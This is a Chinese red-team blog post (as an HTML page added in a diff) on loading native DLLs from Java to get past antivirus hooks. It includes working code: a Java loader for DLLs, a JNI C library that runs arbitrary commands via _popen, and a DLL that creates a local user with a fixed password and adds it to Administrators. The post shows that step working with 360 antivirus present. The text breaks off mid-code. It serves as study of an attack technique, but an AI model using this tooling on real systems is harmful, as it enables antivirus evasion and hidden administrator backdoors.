@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2024/11/07/java-dll/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/11/07/java-dll/","path":"2024/11/07/java-dll/","title":"初探java加载动态链接库"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>初探java加载动态链接库 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#java%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="nav-text">java加载动态链接库</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">流程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Runtime-getRuntime-load"><span class="nav-text">Runtime.getRuntime().load</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#System-load"><span class="nav-text">System.load</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Runtime-getRuntime-loadLibrary"><span class="nav-text">Runtime.getRuntime().loadLibrary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#System-loadLibrary"><span class="nav-text">System.loadLibrary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NativeLibLoader-loadLibrary"><span class="nav-text">NativeLibLoader.loadLibrary</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dll%E7%BC%96%E5%86%99"><span class="nav-text">dll编写</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vs%E7%BC%96%E5%86%99"><span class="nav-text">vs编写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JNI-%E6%8A%80%E6%9C%AF"><span class="nav-text">JNI 技术</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-text">利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jsp"><span class="nav-text">jsp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A6%E5%99%A8%E5%8C%96%E6%80%9D%E8%80%83"><span class="nav-text">武器化思考</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/07/java-dll/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="初探java加载动态链接库 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          初探java加载动态链接库
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-11-07 21:03:21" itemprop="dateCreated datePublished" datetime="2024-11-07T21:03:21+08:00">2024-11-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Red-Team/" itemprop="url" rel="index"><span itemprop="name">Red-Team</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2F6193d09c503d8e057afa1636_Java%20code%20review%20checklist-min-p-1600.jpeg" alt="6193d09c503d8e057afa1636_Java code review checklist-min-p-1600"></p>
+<a id="more"></a>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前两天学习了DLL，又看到了文章，利用java加载动态链接库绕过杀软：<a target="_blank" rel="noopener" href="http://payloads.online/archivers/2022-08-11/1/">通过动态链接库绕过反病毒软件Hook - Break JVM</a></p>
+<p>后部分的内容有点深入，所以浅显的学习一下整体思路。环境：jdk1.8_181、win11、vs2022、win10</p>
+<h1 id="java加载动态链接库"><a href="#java加载动态链接库" class="headerlink" title="java加载动态链接库"></a>java加载动态链接库</h1><p>个人理解，java.exe加载动态链接库有什么用？</p>
+<blockquote>
+<p>感觉有点类似白加黑，直接在DLL里调用win-api去执行一些敏感操作，比如添加用户，shellcode执行，可以避免一些cmd的执行，因为现在webshell都是利用cmd.exe去执行。</p>
+</blockquote>
+<p>java加载动态链接库常见有三种方法</p>
+<ul>
+<li>System.load / System.loadLibrary</li>
+<li>Runtime.getRuntime().load / Runtime.getRuntime().loadLibrary</li>
+<li>com.sun.glass.utils.NativeLibLoader.loadLibrary</li>
+</ul>
+<p>前两个的load与loadLibrary有一些区别</p>
+<ul>
+<li>load接收的是绝对路径</li>
+<li>loadLibrary接收的是相对路径，不能含有 <code>\</code>，可通过目录穿越到达 <strong>jdk安装所在盘或用户环境变量所在盘下的任意路径</strong>，进行加载动态库，调用时不需要动态库的后缀，会自动加上。linux系统应该可以达到任意目录，windows下应该就不行了</li>
+</ul>
+<p>loadDll.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">loadDll</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String path1 = <span class="string">&quot;C:\\Users\\cys\\Desktop\\Dll3.dll&quot;</span>;</span><br><span class="line">        String path2 = <span class="string">&quot;../../../../../Dll3&quot;</span>;  <span class="comment">// &quot;../../../../../users/admin/desktop/Dll3&quot;;</span></span><br><span class="line">        RuntimeLoad(path);</span><br><span class="line">        <span class="comment">//NativeLoad(path2);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">RuntimeLoad</span><span class="params">(String path)</span></span>&#123;</span><br><span class="line">        Runtime.getRuntime().load(path);</span><br><span class="line">        <span class="comment">//Runtime.getRuntime().loadLibrary(path);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SystemLoad</span><span class="params">(String path)</span></span>&#123;</span><br><span class="line">        System.load(path);</span><br><span class="line">        <span class="comment">//System.loadLibrary(path);</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">NativeLoad</span><span class="params">(String path)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class Native = Class.forName(<span class="string">&quot;com.sun.glass.utils.NativeLibLoader&quot;</span>);</span><br><span class="line">        Object c = Native.newInstance();</span><br><span class="line">        <span class="keyword">if</span>(Native != <span class="keyword">null</span>)&#123;</span><br><span class="line">            java.lang.reflect.Method Load = Native.getDeclaredMethod(<span class="string">&quot;loadLibrary&quot;</span>,String.class);</span><br><span class="line">            Load.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Load.invoke(c,path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>计算器dll</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827192556937.png" alt="image-20220827192556937"></p>
+<h1 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h1><h2 id="Runtime-getRuntime-load"><a href="#Runtime-getRuntime-load" class="headerlink" title="Runtime.getRuntime().load"></a>Runtime.getRuntime().load</h2><p>调用了 <strong>Runtime.getRuntime().load0</strong> 方法，在这其中会判断路径是否为 <strong>绝对路径</strong> 然后调用 <strong>ClassLoader#loadLibrary</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827193435766.png" alt="image-20220827193435766"></p>
+<p>判断系统变量路径是否为空，为空就进行初始化。如果传入路径为 <strong>绝对路径</strong> 则调用 <strong>ClassLoader#loadLibrary0</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827194014259.png" alt="image-20220827194014259"></p>
+<p><strong>loadLibrary0</strong> 中判断ClassLoader是否加载过该链接库</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827212303815.png" alt="image-20220827212303815"></p>
+<p>然后实例化 <strong>NativeLibrary</strong> 对象，添加到 nativeLibraryContext 中，然后调用 <strong>load</strong> 方法去加载动态链接库</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827212859147.png" alt="image-20220827212859147"></p>
+<p>load为native方法</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827213236449.png" alt="image-20220827213236449"></p>
+<h2 id="System-load"><a href="#System-load" class="headerlink" title="System.load"></a>System.load</h2><p>直接调用 Runtime.getRuntime().load0 流程同上</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827213836360.png" alt="image-20220827213836360"></p>
+<h2 id="Runtime-getRuntime-loadLibrary"><a href="#Runtime-getRuntime-loadLibrary" class="headerlink" title="Runtime.getRuntime().loadLibrary"></a>Runtime.getRuntime().loadLibrary</h2><p>调用 <strong>Runtime.getRuntime().loadLibrary0</strong> 判断 传入的path不能含有 <code>\</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827223333156.png" alt="image-20220827223333156"></p>
+<p>直接 <strong>ClassLoader.loadLibrary</strong>，这里传入false，代表不是绝对路径， <strong>findLibrary</strong> 去寻找动态库的文件名</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827225620127.png" alt="image-20220827225620127"></p>
+<p>如果没找到，从 <strong>jdk安装路径与用户环境变量路径下</strong>去寻找库， <strong>System.mapLibraryName</strong> 会根据平台自动加上后缀，windows自动在末尾添加 <strong>.dll</strong>，接着调用 <strong>ClassLoader#loadLibrary0</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827230322803.png" alt="image-20220827230322803"></p>
+<p><strong>findBuiltinLib</strong> 检查是否是内置的动态链接库，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31865983/article/details/101856630">Hotspot JNI库文件加载源码解析CSDN博客</a></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827232241822.png" alt="image-20220827232241822"></p>
+<p>最后加载</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827231911788.png" alt="image-20220827231911788"></p>
+<h2 id="System-loadLibrary"><a href="#System-loadLibrary" class="headerlink" title="System.loadLibrary"></a>System.loadLibrary</h2><p>直接调用 Runtime.getRuntime().loadLibrary0 流程同上</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827232454903.png" alt="image-20220827232454903"></p>
+<h2 id="NativeLibLoader-loadLibrary"><a href="#NativeLibLoader-loadLibrary" class="headerlink" title="NativeLibLoader.loadLibrary"></a>NativeLibLoader.loadLibrary</h2><p>提一嘴为什么反射调用</p>
+<blockquote>
+<p>com.sun.glass.utils.NativeLibLoader反射调用是因为在 jdk\javafx-src.zip!\com\sun\glass\utils\NativeLibLoader.java，在不同的版本的jdk中javafx并不是都存在的。</p>
+</blockquote>
+<p>loadLibraryInternal -&gt;loadLibraryFullPath</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220828000908313.png" alt="image-20220828000908313"></p>
+<p>loadLibraryFullPath 绝对路径会加载成功</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220828001637907.png" alt="image-20220828001637907"></p>
+<p>loadLibraryFullPath 失败后，遍历环境变量去调用，这里用相对路径，总有一款适合你！</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220828001805150.png" alt="image-20220828001805150"></p>
+<h1 id="dll编写"><a href="#dll编写" class="headerlink" title="dll编写"></a>dll编写</h1><h2 id="vs编写"><a href="#vs编写" class="headerlink" title="vs编写"></a>vs编写</h2><p>直接vs进行编写，见 <a target="_blank" rel="noopener" href="http://www.yongsheng.site/2022/08/24/DLL%E5%8A%AB%E6%8C%81/">初探DLL劫持 | Y0ng的博客</a></p>
+<p>但是有一个意外情况，在新的win10虚拟机中，单单调用一个calc的dll竟然失败了，尝试了下发现是，我写的dll需要其他依赖库的支持，但是win10虚拟机中并没有这个库，导致无法加载恶意的dll。解决方法就是vs把其他库一起打包喽，运行库选择 <strong>/MT</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220830172612983.png" alt="image-20220830172612983"></p>
+<p>虽然产生的dll很大，不过也算成功执行了。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220830173055178.png" alt="image-20220830173055178"></p>
+<h2 id="JNI-技术"><a href="#JNI-技术" class="headerlink" title="JNI 技术"></a>JNI 技术</h2><p>慢慢了解到 JNI 技术，</p>
+<ul>
+<li><p>定义一个native修饰的方法</p>
+</li>
+<li><p>使用javah进行编译 </p>
+</li>
+<li><p>编写对应的c语言代码</p>
+</li>
+<li><p>使用gcc编译成dll文件</p>
+</li>
+<li><p>编写一个Java类使用System.loadLibrary方法，加载dll文件并且调用</p>
+</li>
+</ul>
+<p>loadDll.java，定义native方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">loadDll</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String dllpath = <span class="string">&quot;D:\\java-sec\\Dll\\src\\cmd.dll&quot;</span>;</span><br><span class="line">        System.load(dllpath);</span><br><span class="line"></span><br><span class="line">        String cmd = exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        System.out.println(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">exec</span><span class="params">(String cmd)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成.h文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javah -cp . loadDll</span><br></pre></td></tr></table></figure>
+
+<p>生成的头文件，loadDll.h</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef _Included_loadDll</span><br><span class="line">#define _Included_loadDll</span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">JNIEXPORT jstring JNICALL Java_loadDll_exec</span><br><span class="line">  (JNIEnv *, jclass, jstring);</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>编写命令执行的c文件，Command.c</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;loadDll.h&quot;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int execmd(const char *cmd, char *result)</span><br><span class="line">&#123;</span><br><span class="line">    char buffer[1024*12];              &#x2F;&#x2F;定义缓冲区</span><br><span class="line">    FILE *pipe &#x3D; _popen(cmd, &quot;r&quot;); &#x2F;&#x2F;打开管道，并执行命令</span><br><span class="line">    if (!pipe)</span><br><span class="line">        return 0; &#x2F;&#x2F;返回0表示运行失败</span><br><span class="line"></span><br><span class="line">    while (!feof(pipe))</span><br><span class="line">    &#123;</span><br><span class="line">        if (fgets(buffer, 128, pipe))</span><br><span class="line">        &#123; &#x2F;&#x2F;将管道输出到result中</span><br><span class="line">            strcat(result, buffer);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    _pclose(pipe); &#x2F;&#x2F;关闭管道</span><br><span class="line">    return 1;      &#x2F;&#x2F;返回1表示运行成功</span><br><span class="line">&#125;</span><br><span class="line">JNIEXPORT jstring JNICALL Java_loadDll_exec(JNIEnv *env, jobject class_object, jstring jstr)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    const char *cstr &#x3D; (*env)-&gt;GetStringUTFChars(env, jstr, NULL);</span><br><span class="line">    char result[1024 * 12] &#x3D; &quot;&quot;; &#x2F;&#x2F;定义存放结果的字符串数组</span><br><span class="line">    if (1 &#x3D;&#x3D; execmd(cstr, result))</span><br><span class="line">    &#123;</span><br><span class="line">       &#x2F;&#x2F; printf(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char return_messge[100] &#x3D; &quot;&quot;;</span><br><span class="line">    strcat(return_messge, result);</span><br><span class="line">    jstring cmdresult &#x3D; (*env)-&gt;NewStringUTF(env, return_messge);</span><br><span class="line">    &#x2F;&#x2F;system();</span><br><span class="line"></span><br><span class="line">    return cmdresult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译为dll</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -I&quot;%JAVA_HOME%\include&quot; -I&quot;%JAVA_HOME%\include\win32&quot; -shared -o cmd.dll Command.c</span><br></pre></td></tr></table></figure>
+
+<p>加载dll，成功。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220830171029376.png" alt="image-20220830171029376"></p>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>这方面利用感觉比较多了，添加用户，命令执行，内网穿透，开启远程登录等等。</p>
+<p>在有360情况下添加用户</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220830204414971.png" alt="image-20220830204414971"></p>
+<p>dll中加上微软示例的添加用户代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;lmaccess.h&gt;</span><br><span class="line">#include &lt;lmerr.h&gt;</span><br><span class="line">#include &lt;Tchar.h&gt;</span><br><span class="line">#pragma comment(lib,&quot;netapi32.lib&quot;)</span><br><span class="line"></span><br><span class="line">DWORD CreateAdminUserInternal(void)</span><br><span class="line">&#123;</span><br><span class="line">	NET_API_STATUS rc;</span><br><span class="line">	BOOL b;</span><br><span class="line">	DWORD dw;</span><br><span class="line"></span><br><span class="line">	USER_INFO_1 ud;</span><br><span class="line">	LOCALGROUP_MEMBERS_INFO_0 gd;</span><br><span class="line">	SID_NAME_USE snu;</span><br><span class="line"></span><br><span class="line">	DWORD cbSid &#x3D; 256;	&#x2F;&#x2F; 256 bytes should be enough for everybody :)</span><br><span class="line">	BYTE Sid[256];</span><br><span class="line"></span><br><span class="line">	DWORD cbDomain &#x3D; 256 &#x2F; sizeof(TCHAR);</span><br><span class="line">	TCHAR Domain[256];</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;</span><br><span class="line">	&#x2F;&#x2F; Create user</span><br><span class="line">	&#x2F;&#x2F; http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;aa370649%28v&#x3D;VS.85%29.aspx</span><br><span class="line">	&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">	memset(&amp;ud, 0, sizeof(ud));</span><br><span class="line"></span><br><span class="line">	ud.usri1_name &#x3D; (LPWSTR)TEXT(&quot;audit&quot;);						&#x2F;&#x2F; username</span><br><span class="line">	ud.usri1_password &#x3D; (LPWSTR)TEXT(&quot;Test123456789!&quot;);				&#x2F;&#x2F; password</span><br><span class="line">	ud.usri1_priv &#x3D; USER_PRIV_USER;					&#x2F;&#x2F; cannot set USER_PRIV_ADMIN on creation</span><br><span class="line">	ud.usri1_flags &#x3D; UF_SCRIPT | UF_NORMAL_ACCOUNT;	&#x2F;&#x2F; must be set</span><br><span class="line">	ud.usri1_script_path &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">	rc &#x3D; NetUserAdd(</span><br><span class="line">		NULL,			&#x2F;&#x2F; local server</span><br><span class="line">		1,				&#x2F;&#x2F; information level</span><br><span class="line">		(LPBYTE)&amp;ud,</span><br><span class="line">		NULL			&#x2F;&#x2F; error value</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	if (rc !&#x3D; NERR_Success) &#123;</span><br><span class="line">		_tprintf(_T(&quot;NetUserAdd FAIL %d 0x%08x\r\n&quot;), rc, rc);</span><br><span class="line">		return rc;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;</span><br><span class="line">	&#x2F;&#x2F; Get user SID</span><br><span class="line">	&#x2F;&#x2F; http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;aa379159(v&#x3D;vs.85).aspx</span><br><span class="line">	&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">	b &#x3D; LookupAccountName(</span><br><span class="line">		NULL,			&#x2F;&#x2F; local server</span><br><span class="line">		_T(&quot;audit&quot;),	&#x2F;&#x2F; account name</span><br><span class="line">		Sid,			&#x2F;&#x2F; SID</span><br><span class="line">		&amp;cbSid,			&#x2F;&#x2F; SID size</span><br><span class="line">		Domain,			&#x2F;&#x2F; Domain</span><br><span class="line">		&amp;cbDomain,		&#x2F;&#x2F; Domain size</span><br><span class="line">		&amp;snu			&#x2F;&#x2F; SID_NAME_USE (enum)</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	if (!b) &#123;</span><br><span class="line">		dw &#x3D; GetLastError();</span><br><span class="line">		_tprintf(_T(&quot;LookupAccountName FAIL %d 0x%08x\r\n&quot;), dw, dw);</span><br><span class="line">		return dw;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;</span><br><span class="line">	&#x2F;&#x2F; Add user to &quot;Administrators&quot; local group</span><br><span class="line">	&#x2F;&#x2F; http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;aa370436%28v&#x3D;VS.85%29.aspx</span><br><span class="line">	&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">	memset(&amp;gd, 0, sizeof(gd));</span><br><span class="line"></span><br><span class="line">	gd.lgrmi0_sid &#x3D; (PSID)Sid;</span><br><span class="line"></span><br><span class="line">	rc &#x3D; NetLocalGroupAddMembers(</span><br><span class="line">		NULL,					&#x2F;&#x2F; local server</span><br><span class="line">		_T(&quot;Administrators&quot;),</span><br><span class="line">		0,						&#x2F;&#x2F; information level</span><br><span class="line">		(LPBYTE)&amp;gd,</span><br><span class="line">		1						&#x2F;&#x2F; only one entry</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	if 